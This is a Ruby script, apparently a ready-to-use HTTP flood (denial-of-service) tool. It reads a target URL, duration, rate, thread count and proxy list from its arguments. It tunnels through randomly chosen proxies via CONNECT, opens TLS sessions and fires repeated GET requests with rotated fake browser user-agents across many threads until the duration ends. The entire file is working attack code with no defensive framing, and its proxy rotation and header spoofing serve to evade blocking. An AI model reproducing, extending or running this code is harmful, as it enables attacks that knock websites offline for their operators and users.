# Code by Sussy Baka
require 'socket'
require 'openssl'
require 'uri'

$targetURL = ARGV[0]
$duration = ARGV[1].to_i
$rate = ARGV[2].to_i
$threads = ARGV[3].to_i
$proxyFile = ARGV[4]
$timeout = 30

$proxies = File.readlines($proxyFile)
$target = URI.parse($targetURL)

$user_agents = [
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.58 Mobile/15E148 Safari/604.1',
	'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.58 Mobile/15E148 Safari/604.1',
	'Mozilla/5.0 (iPod; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.58 Mobile/15E148 Safari/604.1',
	'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5938.153 Mobile Safari/537.36',
];

class EasySocket
  def connect(host, port, timeout)
    @host = host
    @port = port
    @timeout = timeout

    @socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
    @socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
    @socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
    socket_address = Socket.pack_sockaddr_in(@port, @host)
    begin
      @socket.connect_nonblock(socket_address)
    rescue Errno::EINPROGRESS
      raise 'Connection timeout exceeded' unless @socket.wait_writable(@timeout)
      begin
        @socket.connect_nonblock(socket_address)
      rescue Errno::EISCONN
      end
    end
    return self
  end
  def write(data)
    begin
      @socket.write_nonblock data
    rescue IO::WaitReadable
      IO.select nil, [@socket], nil, @timeout
      retry
    end
    @socket.flush
  end
  def read(size)
    data = ""
    begin
      data += @socket.read_nonblock size
    rescue IO::WaitReadable
      IO.select [@socket], nil, nil, @timeout
      retry
    end
    return data
  end
  def close
    @socket.close
  end
  def set_socket(socket)
    @socket = socket
  end
  def get_socket()
    return @socket
  end
end

class Tunnel < EasySocket
  def initialize(host, port, target_address, timeout)
    @host = host
    @port = port
    @target_address = target_address
    address = @target_address.split ':'
    @address_host = address[0]
    @address_port = address[1].to_i
    @timeout = timeout
  end
  def HTTP()
    payload = "CONNECT " + @target_address + " HTTP/1.1\r\nHost: " + @address_host + " \r\n\r\n"
    begin
      socket = connect @host, @port, @timeout
      socket.write payload
      data = socket.read 1024
      if data.include? "HTTP/1.1 200"
        return socket
      else
        raise 'Invalid response from server'
      end
    rescue Exception => error
      raise error
    end
  end
end

def flooder
  headers = "";
  headers += "GET / HTTP/1.1\r\n";
  headers += "Host: " + $target.host + "\r\n";
  headers += "Connection: keep-alive\r\n";
  headers += "User-Agent: " + $user_agents.sample + "\r\n";
  headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n";
  headers += "Accept-Language: en-US,en;q=0.9\r\n";
  headers += "Cache-Control: max-age=0\r\n";
  headers += "Accept-Encoding: gzip, deflate, br\r\n";
  headers += "Upgrade-Insecure-Requests: 1\r\n";
  headers += "\r\n";
  while true
    begin
      proxy = $proxies.sample.split(':')
      tunnel = Tunnel.new proxy[0], proxy[1].to_i, $target.host + ":443", $timeout
      socket = tunnel.HTTP
      context = OpenSSL::SSL::SSLContext::new
      secure_socket = OpenSSL::SSL::SSLSocket.new socket.get_socket, context
      secure_socket.hostname = $target.host
      begin
        secure_socket.connect_nonblock
      rescue IO::WaitReadable
        IO.select [secure_socket], nil, nil, $timeout
        retry
      rescue IO::WaitWritable
        IO.select nil, [secure_socket], nil, $timeout
        retry
      end
      socket = socket.set_socket secure_socket
      $rate.times do
        socket.write headers
      end
      socket.close
    rescue
      next
    end
  end
end
thread_list = []
$threads.times do
  thread = Thread.new {
    flooder()
  }
  thread.run
end
sleep $duration
